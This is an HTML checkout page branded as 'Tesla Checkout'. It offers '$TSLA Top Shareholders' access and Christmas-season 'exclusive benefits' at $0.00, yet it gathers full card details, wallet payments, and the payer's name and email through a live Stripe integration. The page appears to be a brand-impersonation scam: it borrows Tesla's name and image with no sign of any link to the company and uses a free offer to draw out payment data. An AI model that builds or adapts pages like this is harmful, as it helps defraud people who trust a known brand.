<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tesla Checkout</title>

    <script src="https://js.stripe.com/v3/"></script>

    <style>
        body {
            background: #f5f5f7;
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            padding: 40px 0;
        }

        .checkout-box {
            width: 420px;
            background: #ffffff;
            border-radius: 18px;
            padding: 35px;
            box-shadow: 0 10px 28px rgba(0,0,0,0.12);
            text-align: center;
        }

        .tesla-img {
            width: 160px;
            margin-bottom: 25px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .title {
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 12px;
        }

        .subtitle {
            font-size: 15px;
            margin-bottom: 22px;
            color: #555;
            line-height: 1.5;
            padding: 0 10px;
        }

        .badge {
            display: inline-block;
            background: #e7f3ff;
            color: #005bbb;
            font-size: 12px;
            padding: 7px 14px;
            border-radius: 6px;
            margin-bottom: 24px;
            font-weight: 600;
        }

        .price-box {
            background: #fafafa;
            border-radius: 14px;
            padding: 20px;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: 700;
        }

        #payment-request-button {
            margin-bottom: 25px;
        }

        #payment-element {
            margin-top: 10px;
            margin-bottom: 28px;
            text-align: left;
        }

        button {
            width: 100%;
            background: black;
            color: white;
            padding: 16px;
            font-size: 17px;
            border-radius: 12px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }

        button:hover {
            background: #333;
        }
    </style>
</head>

<body>
    <div class="checkout-box">

        <!-- TESLA IMAGE -->
        <img src="/static/tesla.png" class="tesla-img">

        <!-- TITLE -->
        <div class="title">$TSLA Top Shareholders</div>

        <!-- SUBTITLE -->
        <div class="subtitle">
            Secure your spot to connect with Tesla's top holders and enjoy 
            exclusive benefits for the Tesla Christmas season.
        </div>

        <!-- SECURE BADGE -->
        <div class="badge">Secure Checkout</div>

        <!-- PRICE -->
        <div class="price-box">$0.00</div>

        <!-- REAL APPLE PAY / GOOGLE PAY BUTTON -->
        <div id="payment-request-button"></div>

        <!-- CARD FORM -->
        <form id="payment-form">
            <div id="payment-element"></div>
            <button id="submit">JOIN</button>
        </form>

    </div>

    <script>
        const stripe = Stripe("pk_live_51SUYa2L1rAu5PUSZ73EacQ8pW2GSqrZqCcV7cCPhAZonXosw4HMqYe5cgv0W20i1Tt338r7Wfq3wdLzrLozOWvA600wc5RkdNL");

        initialize();

        async function initialize() {

            // Create session on backend
            const { clientSecret } = await fetch("/create-checkout-session", {
                method: "POST",
                headers: { "Content-Type": "application/json" }
            }).then(r => r.json());

            const elements = stripe.elements({ clientSecret });

            // REAL Apple Pay / Google Pay
            const paymentRequest = stripe.paymentRequest({
                country: "US",
                currency: "usd",
                total: {
                    label: "Tesla Shareholder Access",
                    amount: 0  // $0.00
                },
                requestPayerName: true,
                requestPayerEmail: true
            });

            const prButton = elements.create("paymentRequestButton", {
                paymentRequest
            });

            const result = await paymentRequest.canMakePayment();

            if (result) {
                document.getElementById("payment-request-button").style.display = "block";
                prButton.mount("#payment-request-button");
            } else {
                document.getElementById("payment-request-button").style.display = "none";
            }

            // Card Element (full card form)
            const paymentElement = elements.create("payment", {
                layout: "tabs"
            });
            paymentElement.mount("#payment-element");

            // Form handler
            document
                .getElementById("payment-form")
                .addEventListener("submit", async (e) => {
                    e.preventDefault();

                    const { error } = await stripe.confirmPayment({
                        elements,
                        confirmParams: {
                            return_url: window.location.origin + "/success.html"
                        }
                    });

                    if (error) {
                        alert(error.message);
                    }
                });
        }
    </script>
</body>
</html>
